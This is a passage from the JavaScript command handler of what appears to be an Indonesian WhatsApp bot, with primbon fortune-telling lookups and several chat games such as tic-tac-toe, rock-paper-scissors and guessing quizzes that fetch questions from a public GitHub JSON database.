if (!q) return reply( `Example : ${prefix + command} 28, 12, 2021`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Lahir :* ${anu.message.hari_lahir}
• *Usaha :* ${anu.message.usaha}`
reply(teks)
}
break
    case 'rejeki': 
case 'rezeki': {
if (!q) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Lahir :* ${anu.message.hari_lahir}
• *Rezeki :* ${anu.message.rejeki}
• *Catatan :* ${anu.message.catatan}`
reply(teks)
}
break
case 'pekerjaan':  {
if (!q) return reply( `Example : ${prefix + command}  7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Lahir :* ${anu.message.hari_lahir}
• *Pekerjaan :* ${anu.message.pekerjaan}
• *Catatan :* ${anu.message.catatan}`
reply(teks)
}
break
case 'ramalnasib': 
case 'nasib': {
if (!q) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.ramalan_nasib(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Analisa :* ${anu.message.analisa}
• *Angka Akar :* ${anu.message.angka_akar}
• *Sifat :* ${anu.message.sifat}
• *Elemen :* ${anu.message.elemen}
• *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`
reply(teks)
}
break 
case 'penyakit': {
if (!q) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Analisa :* ${anu.message.analisa}
• *Sektor :* ${anu.message.sektor}
• *Elemen :* ${anu.message.elemesektorn}
• *Catatan :* ${anu.message.catatan}`
reply(teks)
}
break
case 'artitarot': 
case 'tarot': {
if (!q) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Lahir :* ${anu.message.tgl_lahir}
• *Simbol Tarot :* ${anu.message.simbol_tarot}
• *Arti :* ${anu.message.arti}
• *Catatan :* ${anu.message.catatan}`
reply(teks)
}
break
case 'fengshui': {
if (!q) return reply( `Example : ${prefix + command} aqio, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`)
let [nama, gender, tahun] = q.split`,`
let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Nama :* ${anu.message.nama} 
• *Lahir :* ${anu.message.tahun_lahir}
• *Gender :* ${anu.message.jenis_kelamin}
• *Angka Kua :* ${anu.message.angka_kua}
• *Kelompok :* ${anu.message.kelompok}
• *Karakter :* ${anu.message.karakter}
• *Sektor Baik :* ${anu.message.sektor_baik}
• *Sektor Buruk :* ${anu.message.sektor_buruk}`
reply(teks)
}
break
case 'haribaik': {
if (!q) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.petung_hari_baik(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Lahir :* ${anu.message.tgl_lahir}
•™*Kala Tinantang :* ${anu.message.kala_tinantang}
• *Info :* ${anu.message.info}
• *Catatan :* ${anu.message.catatan}`
reply(teks)
}
break
case 'harisangar': 
case 'taliwangke': {
if (!q) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Lahir :* ${anu.message.tgl_lahir}
• *Hasil :* ${anu.message.result}
• *Info :* ${anu.message.info}
• *Catatan :* ${anu.message.catatan}`
reply(teks)
}
break
case 'harisial': {
if (!q) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Hari Lahir :* ${anu.message.hari_lahir}
• *Tanggal Lahir :* ${anu.message.tgl_lahir}
• *Hari Naas :* ${anu.message.hari_naas}
• *Info :* ${anu.message.catatan}
• *Catatan :* ${anu.message.info}`
reply(teks)
}
break
case 'harinaga': {
if (!q) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Hari Lahir :* ${anu.message.hari_lahir}
• *Tanggal Lahir :* ${anu.message.tgl_lahir}
• *Arah Naga Hari :* ${anu.message.arah_naga_hari}
• *Catatan :* ${anu.message.catatan}`
reply(teks)
}
break
case 'arahrejeki': 
case 'arahrezeki': {
if (!q) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Hari Lahir :* ${anu.message.hari_lahir}
• *tanggal Lahir :* ${anu.message.tgl_lahir}
• *Arah Rezeki :* ${anu.message.arah_rejeki}
• *Catatan :* ${anu.message.catatan}`
reply(teks)
}
break
case 'peruntungan': {
if (!q) return reply( `Example : ${prefix + command} tetotz, 28, 6, 2004, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`)
let [nama, tgl, bln, thn, untuk] = q.split`,`
let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Nama :* ${anu.message.nama}
• *Lahir :* ${anu.message.tgl_lahir}
• *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}
• *Hasil :* ${anu.message.result}
• *Catatan :* ${anu.message.catatan}`
}
break
case 'weton': 
case 'wetonjawa': {
if (!q) return reply( `Example : ${prefix + command} 7, 7, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Tanggal :* ${anu.message.tanggal}
• *Jumlah Neptu :* ${anu.message.jumlah_neptu}
• *Watak Hari :* ${anu.message.watak_hari}
• *Naga Hari :* ${anu.message.naga_hari}
• *Jam Baik :* ${anu.message.jam_baik}
• *Watak Kelahiran :* ${anu.message.watak_kelahiran}`
reply(teks)
}
break
case 'karakter': {
if (!q) return reply( `Example : ${prefix + command} tetotz, 28, 6, 2004`)
let [nama, tgl, bln, thn] = q.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Nama :* ${anu.message.nama}
• *Lahir :* ${anu.message.tgl_lahir}
• *Garis Hidup :* ${anu.message.garis_hidup}`
reply(teks)
}
break
case 'keberuntungan': {
if (!q) return reply( `Example : ${prefix + command} tetotz, 28, 6, 2004`)
let [nama, tgl, bln, thn] = q.split`,`
let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
if (anu.status == false) return m.reply(anu.message)
let teks = `
• *Nama :* ${anu.message.nama}
• *Lahir :* ${anu.message.tgl_lahir}
• *Hasil :* ${anu.message.result}`
reply(teks)
}
break
case 'masasubur': {
if (!q) return reply( `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`)
let [tgl, bln, thn, siklus] = q.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return m.reply(anu.message)
let teks = `
•  *Hasil :* ${anu.message.result}
•  *Catatan :* ${anu.message.catatan}`
reply(teks)
}
break
  case 'zodiak': 
case 'zodiac': {
if (!q) return reply( `Example : ${prefix + command} 7 7 2005`)
let zodiak = [
                    ["capricorn", new Date(1970, 0, 1)],
                    ["aquarius", new Date(1970, 0, 20)],
                    ["pisces", new Date(1970, 1, 19)],
                    ["aries", new Date(1970, 2, 21)],
                    ["taurus", new Date(1970, 3, 21)],
                    ["gemini", new Date(1970, 4, 21)],
                    ["cancer", new Date(1970, 5, 22)],
                    ["leo", new Date(1970, 6, 23)],
                    ["virgo", new Date(1970, 7, 23)],
                    ["libra", new Date(1970, 8, 23)],
                    ["scorpio", new Date(1970, 9, 23)],
                    ["sagittarius", new Date(1970, 10, 22)],
                    ["capricorn", new Date(1970, 11, 22)]
].reverse()
function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
let date = new Date(q)
if (date == 'Invalid Date') throw date
let d = new Date()
let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
let zodiac = await getZodiac(birth[1], birth[2])
let anu = await primbon.zodiak(zodiac)
if (anu.status == false) return m.reply(anu.message)
let teks = `
∘ *Zodiak :* ${anu.message.zodiak}
∘ *Nomor :* ${anu.message.nomor_keberuntungan}
∘ *Aroma :* ${anu.message.aroma_keberuntungan}
∘ *Planet :* ${anu.message.planet_yang_mengitari}
∘ *Bunga :* ${anu.message.bunga_keberuntungan}
∘ *Warna :* ${anu.message.warna_keberuntungan} 
∘ *Batu :* ${anu.message.batu_keberuntungan}
∘ *Elemen :* ${anu.message.elemen_keberuntungan}
∘ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}
∘ *Catatan :* ${anu.message.catatan}`
reply(teks)
}
break

 // ===================================== // games
 case 'ttc':
case 'ttt':
case 'tictactoe': {
let TicTacToe = require("./src/tictactoe.js");
this.game = this.game ? this.game : {};
if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return m.reply('Kamu masih didalam game');
let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true));
if (room) {
m.reply('Partner ditemukan!');
room.o = m.chat;
room.game.playerO = m.sender;
room.state = 'PLAYING';
let arr = room.game.render().map(v => {
return {
X: `❌`,
O: `⭕`,
1: `1️⃣`,
2: `2️⃣`,
3: `3️⃣`,
4: `4️⃣`,
5: `5️⃣`,
6: `6️⃣`,
7: `7️⃣`,
8: `8️⃣`,
9: `9️⃣`,
}[v];
});
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`;
if (room.x !== room.o) await ptz.sendText(room.x, str, m, {
mentions: parseMention(str)
});
await ptz.sendText(room.o, str, m, {
mentions: parseMention(str)
});
} else {
room = {
id: 'tictactoe-' + (+new Date),
x: m.chat,
o: '',
game: new TicTacToe(m.sender, 'o'),
state: 'WAITING'
};
if (text) room.name = text;
m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''));
this.game[room.id] = room;
}
}
break
//=================================================//
case 'delttc':
case 'delttt': {
this.game = this.game ? this.game : {};
try {
if (this.game) {
delete this.game;
ptz.sendText(m.chat, `Berhasil delete session TicTacToe`, m);
} else if (!this.game) {
m.reply(`Session TicTacToe tidak ada`);
} else m.reply('?');
} catch (e) {
m.reply('rusak');
}
}
break;

case 'suitpvp': case 'suit': {

this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, from, { mentions: [owner[1] + '@s.whatsapp.net'] })
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
let id = 'suit_' + new Date() * 1
let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
this.suit[id] = {
chat: await ptz.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) ptz.sendText(m.chat, `_Waktu suit habis_`, m)
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break

case 'tebakgambar':
    if (userdb.tebakgambar === true) return m.reply("Ada soal yang belum terjawab.");
    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json');
    let result = anu[Math.floor(Math.random() * anu.length)];
    
    ptz.sendMessage(m.chat, {
        image: {
            url: result.img
        },
        caption: `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`
    }, {
        quoted: m
    }).then(() => {
      tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase().trim().replace(/\s+/g, ' ');
    });
    console.log("Jawaban: " + result.jawaban);
    userdb.jawaban = result.jawaban
    userdb.tebakgambar = true;
    await sleep(60000);
     if (userdb.tebakgambar === false) return 
    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
        console.log("Jawaban: " + userdb.jawaban);
        ptz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}`, m);
        userdb.tebakgambar = false;
        delete tebakgambar[m.sender.split('@')[0]];
    }
    break;

case "tebakkata":
if (userdb.tebakkata === true) return m.reply("Ada soal yang belum terjawab.");
const anuvd9 = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json');
const result99 = anuvd9[Math.floor(Math.random() * anuvd9.length)];
ptz.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result99.soal}\nWaktu : 60s`, m).then(() => {
tebakkata[m.sender.split('@')[0]] = result99.jawaban.toLowerCase();
});
userdb.jawaban = result99.jawaban
userdb.tebakkata = true
console.log("Jawaban: " + result99.jawaban);
await sleep(60000);
if (userdb.tebakkata === false) return 
if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
ptz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}`, m);
userdb.tebakkata = false
delete tebakkata[m.sender.split('@')[0]];
}
break

case "tebakkalimat":
if (userdb.tebakkalimat === true) return m.reply("Ada soal yang belum terjawab.");
let anuka = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json');
let result09 = anuka[Math.floor(Math.random() * anuka.length)];
ptz.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result09.soal}\nWaktu : 60s`, m).then(() => {
tebakkalimat[m.sender.split('@')[0]] = result09.jawaban.toLowerCase();
});
userdb.jawaban = result09.jawaban
userdb.tebakkalimat = true
console.log("Jawaban: " + result09.jawaban);
await sleep(60000);
if (userdb.tebakkalimat === false) return 
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
ptz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}`, m);
userdb.tebakkalimat = false
delete tebakkalimat[m.sender.split('@')[0]];
}
break

case "tebaklirik":
if (userdb.tebaklirik === true) return m.reply("Ada soal yang belum terjawab.");
let anuoo = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json');
let result098 = anuoo[Math.floor(Math.random() * anuoo.length)];
 ptz.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result098.soal}*?\nWaktu : 60s`, m).then(() => {
tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase();
});
userdb.jawaban = result098.jawaban
userdb.tebaklirik = true
console.log("Jawaban: " + result098.jawaban);
await sleep(60000);
if (userdb.tebaklirik === false) return 
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
ptz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}`, m);
userdb.tebaklirik = false
delete tebaklirik[m.sender.split('@')[0]];
}
break

case "tebaktebakan":
if (userdb.tebaktebakan === true) return m.reply("Ada soal yang belum terjawab.");
try {
let anubvb = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaktebakan.json');
let result77 = anubvb[Math.floor(Math.random() * anubvb.length)];
ptz.sendText(m.chat, `Jawablah Pertanyaan Berikut : *${result77.soal}*?\nWaktu : 60s`, m).then(() => {
tebaktebakan[m.sender.split('@')[0]] = result.jawaban.toLowerCase();
});
const jawabnyuhbh = result77.jawaban
userdb.jawaban = jawabnyuhbh.charAt(0).toLowerCase() + jawabnyuhbh.slice(1);
userdb.tebaktebakan = true
console.log("Jawaban: " + result77.jawaban);
await sleep(60000);
if (userdb.tebaktebakan === false) return 
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) {
userdb.tebaktebakan = false
ptz.sendText(m.chat, `Waktu Habis\nJawaban: ${userdb.jawaban}`, m);
delete tebaktebakan[m.sender.split('@')[0]];
}
} catch (e) {
m.reply(util.format(e))
}
break

case "tebakbendera":
if (userdb.tebakbendera === true) return m.reply("Ada soal yang belum terjawab.");
let anubom = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera.json');
let result770 = anubom[Math.floor(Math.random() * anubom.length)];
const jawabnyuhbhv = result770.name
userdb.jawaban = jawabnyuhbhv.charAt(0).toLowerCase() + jawabnyuhbhv.slice(1);
userdb.tebakbendera = true



const flaggame = await sendPinterestImagegame(result770.name + " flags", m);
ptz.sendMessage(m.chat, {
                image: { url: flaggame },
                caption: `Silahkan Jawab Gambar Berikut\n\nClue: ${result770.flag}\nWaktu: 60s`,
            }, { quoted: m }).then(() => {
tebakbendera[m.sender.split('@')[0]] = result.jawaban.toLowerCase();
});
            
console.log("Jawaban: " + result770.name);
await sleep(60000);
if (userdb.tebakbendera === false) return 
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) {
userdb.tebakbendera = false
ptz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakbendera[m.sender.split('@')[0]]}`, m);
delete tebakbendera[m.sender.split('@')[0]];
}
break

case "tebakkimia":
if (userdb.tebakkimia === true) return m.reply("Ada soal yang belum terjawab.");
let anucro = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkimia.json');

let resultkon = anucro[Math.floor(Math.random() * anucro.length)];

ptz.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nUnsur : ${resultkon.unsur}\nWaktu : 60s`, m).then(() => {
tebakkimia[m.sender.split('@')[0]] = resultkon.lambang.toLowerCase();
});
const jawabnyuhbhvv = resultkon.lambang
userdb.jawaban = jawabnyuhbhvv.charAt(0).toLowerCase() + jawabnyuhbhvv.slice(1);
userdb.tebakkimia = true
console.log("Jawaban: " + resultkon.lambang);
await sleep(60000);
if (userdb.tebakkimia === false) return 
if (tebakkimia.hasOwnProperty(m.sender.split('@')[0])) {
userdb.tebakkimia = false
ptz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakkimia[m.sender.split('@')[0]]}`, m);
delete tebakkimia[m.sender.split('@')[0]];
}
break

case "tebaktekateki":
if (userdb.tebaktekateki === true) return m.reply("Ada soal yang belum terjawab.");

let anukontolid = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tekateki.json');
let resultkontil = anukontolid[Math.floor(Math.random() * anukontolid.length)];
ptz.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${resultkontil.soal}\nWaktu : 60s`, m).then(() => {
tebaktekateki[m.sender.split('@')[0]] = resultkontil.jawaban.toLowerCase();
});
const jawabnyuhbhvvvv = resultkontil.jawaban
userdb.jawaban = jawabnyuhbhvvvv.charAt(0).toLowerCase() + jawabnyuhbhvvvv.slice(1);
userdb.tebaktekateki = true
console.log("Jawaban: " + resultkontil.jawaban);
await sleep(60000);
if (userdb.tebaktekateki === false) return 
if (tebaktekateki.hasOwnProperty(m.sender.split('@')[0])) {
userdb.tebaktekateki = false
ptz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaktekateki[m.sender.split('@')[0]]}`, m);
delete tebaktekateki[m.sender.split('@')[0]];
}
break

case "tebaksusunkata":
if (userdb.tebaksusunkata === true) return m.reply("Ada soal yang belum terjawab.");
let anu018 = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json');
let result01012 = anu018[Math.floor(Math.random() * anu018.length)];
ptz.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${result01012.soal}\nTipe : ${result01012.tipe}\nWaktu : 60s`, m).then(() => {
tebaksusunkata[m.sender.split('@')[0]] = result01012.jawaban.toLowerCase();
});
const jawabnyuhbhvvvvc = result01012.jawaban
userdb.jawaban = jawabnyuhbhvvvvc
userdb.tebaksusunkata = true
console.log("Jawaban: " + result01012.jawaban);
await sleep(60000);
if (userdb.tebbaksusunkata === false) return
if (tebaksusunkata.hasOwnProperty(m.sender.split('@')[0])) {
userdb.tebbaksusunkata = false
ptz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaksusunkata[m.sender.split('@')[0]]}`, m);
delete tebaksusunkata[m.sender.split('@')[0]];
}
break

case "tebaksiapaaku":
if (userdb.tebaksiapaaku === true) return m.reply("Ada soal yang belum terjawab.");
let anufujo0 = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/siapakahaku.json');
let resultanaka = anufujo0[Math.floor(Math.random() * anufujo0.length)];
ptz.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${resultanaka.soal}\nWaktu : 60s`, m).then(() => {
tebaksiapakahaku[m.sender.split('@')[0]] = resultanaka.jawaban.toLowerCase();
});
const jawabnyuhbhvvvvc0 = resultanaka.jawaban
userdb.jawaban = jawabnyuhbhvvvvc0.charAt(0).toLowerCase() + jawabnyuhbhvvvvc0.slice(1);
userdb.tebaksiapaaku = true
console.log("Jawaban: " + resultanaka.jawaban);
await sleep(60000);
if (userdb.tebaksiapaaku === false) return
if (tebaksiapakahaku.hasOwnProperty(m.sender.split('@')[0])) {
userdb.tebaksiapaaku = false
ptz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaksiapakahaku[m.sender.split('@')[0]]}`, m);
delete tebaksiapakahaku[m.sender.split('@')[0]];
}
break

case "tebakasahotak":
if (userdb.tebakasahotak === true) return m.reply("Ada soal yang belum terjawab.");
let anuxxx1 = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/asahotak.json');
let resultomeg1 = anuxxx1[Math.floor(Math.random() * anuxxx1.length)];
ptz.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${resultomeg1.soal}\nWaktu : 60s`, m).then(() => {
tebakasahotak[m.sender.split('@')[0]] = resultomeg1.jawaban.toLowerCase();
});
const jawabnyuhbhvvvvc00 = resultomeg1.jawaban
userdb.jawaban = jawabnyuhbhvvvvc00.charAt(0).toLowerCase() + jawabnyuhbhvvvvc00.slice(1);
userdb.tebakasahotak = true
console.log("Jawaban: " + resultomeg1.jawaban);
await sleep(60000);
if (userdb.tebakasahotak === false) return
if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0])) {
userdb.tebakasahotak = false
ptz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakasahotak[m.sender.split('@')[0]]}`, m);
delete tebakasahotak[m.sender.split('@')[0]];
}
break
            case 'kuismath': 
            case 'math': {
            if (userdb.kuismath === true) return m.reply("Ada soal yang belum terjawab.");
            let { genMath, modes } = require('./src/math.js')
                if (!text) return m.reply(`Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`)
                let resultmathjs = await genMath(text.toLowerCase())
                ptz.sendText(m.chat, `*Berapa hasil dari: ${resultmathjs.soal.toLowerCase()}*?\n\nWaktu: 20 detik`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = resultmathjs.jawaban
                })
                console.log("Jawaban: " + resultmathjs.jawaban)
                userdb.jawaban = `${resultmathjs.jawaban}`
                userdb.kuismath = true
                await sleep(20000)
                if (userdb.kuismath === false) return
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    userdb.kuismath = false
                    reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break   
            

    case 'petakbom':
    if (userdb.petakbom === true) return m.reply("masih ada session")
        if (m.sender in this.petakbom) {
            return reply(`Game mu masih belum terselesaikan, lanjutkan yukk\n\n${this.petakbom[m.sender].board.join("")}\n\nKirim ${prefix}delpetakbom untuk menghapus game petak bom`);
        }

        function shuffle(array) {
            return array.sort(() => Math.random() - 0.5);
        }

        this.petakbom[m.sender] = {
            petak: shuffle([0, 0, 0, 2, 0, 2, 0, 2, 0, 0]),
            board: ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"],
            bomb: 3,
            lolos: 7,
            pick: 0,
            nyawa: ["❤️", "❤️"]
        };
        userdb.petakbom = true
        await m.reply(`*PETAK BOM*\n\n${this.petakbom[m.sender].board.join("")}\n\nPilih lah nomor tersebut! dan jangan sampai terkena Bom!\nBomb : ${this.petakbom[m.sender].bomb}\nNyawa : ${this.petakbom[m.sender].nyawa.join("")}`);
        break;

    case 'delpetakbom':
        if (userdb.petakbom === false) return m.reply(`Kamu sedang tidak bermain petakbom!`);
        delete this.petakbom[m.sender];
        userdb.petakbom = false
        m.reply(`Permainan petakbom telah diakhiri.`);
        break;

case 'caklontong':
   if (userdb.caklontong === true) return m.reply("Jawab dulu yang tadi")
 let anucaklontong = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
 let fetchcaklont = anucaklontong[Math.floor(Math.random() * anucaklontong.length)]
 ptz.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n*${fetchcaklont.soal}*\nWaktu : 2 menit`, m).then(() => {
 caklontong[m.sender.split('@')[0]] = fetchcaklont.jawaban.toLowerCase()
caklontong_desk[m.sender.split('@')[0]] = fetchcaklont.deskripsi
 })
 console.log("Jawaban: " + fetchcaklont.jawaban)
 userdb.caklontong = true
 userdb.jawaban = fetchcaklont.jawaban.toLowerCase()
 await sleep(60000)
  if (userdb.caklontong === false) return
 if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
 
 ptz.sendMessage(m.chat, {text: `Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik .caklontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
 }
 
    break;

                              
case "jawab":
    if (!text) return    
    if (userdb.tebakgambar === true) {
        kuis = true;
        let jawaban = userdb.jawaban
        let userJawaban = text.toUpperCase();
        if (text === "nyerah") {
            await m.reply('*Anda Telah menyerah*');
            delete tebakgambar[m.sender.split('@')[0]];
            userdb.tebakgambar = false;
        } else if (userJawaban === jawaban) {
            await ptz.sendText(m.chat, '*`[ Tebak Gambar ]`*\n\nJawaban Benar 🎉\n- mendapat 150 bits', m);    
            delete tebakgambar[m.sender.split('@')[0]];
            userdb.bits += 143
            userdb.tebakgambar = false;
        } else {
            m.reply('*Jawaban Salah!*');
        }
    } else if (userdb.tebakkata === true) {
    kuis = true;
  jawaban = userdb.jawaban
  jawabres = text.toUpperCase();
 if (text == "nyerah") {
await m.reply('*Anda Telah menyerah*')
userdb.tebakkata = false
delete tebakkata[m.sender.split('@')[0]]
} else if (jawabres === jawaban) {
await ptz.sendText(m.chat, '*`[ Tebak Kata ]`*\n\nJawaban Benar 🎉\n- mendapat 150 bits', m);    
userdb.tebakkata = false
userdb.bits += 143
delete tebakkata[m.sender.split('@')[0]]
} else {
m.reply('*Jawaban Salah!*')
}
    } else if (userdb.tebakkalimat === true) {
 kuis = true;
  jawaban = userdb.jawaban
 jawabres = text
 if (text == "nyerah") {
await m.reply('*Anda Telah menyerah*')
userdb.tebakkalimat = false
delete tebakkalimat[m.sender.split('@')[0]]
} else if (jawabres === jawaban) {
await ptz.sendText(m.chat, '*`[ Tebak Kalimat ]`*\n\nJawaban Benar 🎉\n- mendapat 150 bits', m);    
userdb.tebakkalimat = false
userdb.bits += 143
delete tebakkalimat[m.sender.split('@')[0]]
} else {
m.reply('*Jawaban Salah!*')
}
    } else if (userdb.tebaklirik === true) {
         kuis = true;
     jawabanban = userdb.jawaban
 jawabresres = text.charAt(0).toUpperCase() + text.slice(1);
   if (text == "nyerah") {
await m.reply('*Anda Telah menyerah*')
userdb.tebaklirik = false
delete tebaklirik[m.sender.split('@')[0]]
} else if (jawabresres === jawabanban) {
await ptz.sendText(m.chat, '*`[ Tebak Lirik ]`*\n\nJawaban Benar 🎉\n- mendapat 150 bits', m);    
userdb.tebaklirik = false
userdb.bits += 143
delete tebaklirik[m.sender.split('@')[0]]
} else {
m.reply('*Jawaban Salah!*')
}

} else if (userdb.tebaktebakan === true) {
try {
